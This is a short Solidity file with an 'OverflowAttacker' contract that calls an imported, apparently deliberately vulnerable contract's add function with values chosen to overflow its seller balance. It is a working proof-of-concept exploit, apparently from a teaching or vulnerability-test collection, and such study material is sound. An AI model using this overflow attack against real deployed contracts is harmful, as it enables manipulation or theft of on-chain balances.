pragma solidity ^0.4.15;

import "./integer_overflow_1.sol";

contract OverflowAttacker {
    Overflow public victim_contract;

    constructor (address _overflowAddress) public {
        victim_contract = Overflow(_overflowAddress);
    }

    function attack() public {
        uint maxUint = 2**256 - 1;

        // Call the add function with a value that will cause an overflow
        victim_contract.add(maxUint - victim_contract.getSellerBalance());
        victim_contract.add(1);
    }
}